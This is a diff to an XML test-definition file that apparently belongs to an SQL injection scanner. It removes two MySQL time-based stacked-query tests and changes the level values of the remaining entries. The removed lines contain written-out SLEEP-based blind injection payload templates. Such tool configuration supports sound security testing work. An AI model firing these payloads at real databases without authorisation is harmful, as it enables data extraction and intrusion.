@@ -3,50 +3,9 @@
 <root>
     <!-- Stacked queries tests -->
     <test>
-        <title>MySQL &gt; 5.0.11 stacked queries (SLEEP - comment)</title>
-        <stype>4</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>0</clause>
-        <where>1</where>
-        <vector>;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
-        <request>
-            <payload>;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
-            <comment>#</comment>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt; 5.0.11 stacked queries (SLEEP)</title>
-        <stype>4</stype>
-        <level>2</level>
-        <risk>1</risk>
-        <clause>0</clause>
-        <where>1</where>
-        <vector>;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
-        <request>
-            <payload>;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
-        </details>
-    </test>
-
-    <test>
         <title>MySQL &gt; 5.0.11 stacked queries (comment)</title>
         <stype>4</stype>
-        <level>2</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
@@ -67,7 +26,7 @@
     <test>
         <title>MySQL &gt; 5.0.11 stacked queries</title>
         <stype>4</stype>
-        <level>3</level>
+        <level>2</level>
         <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
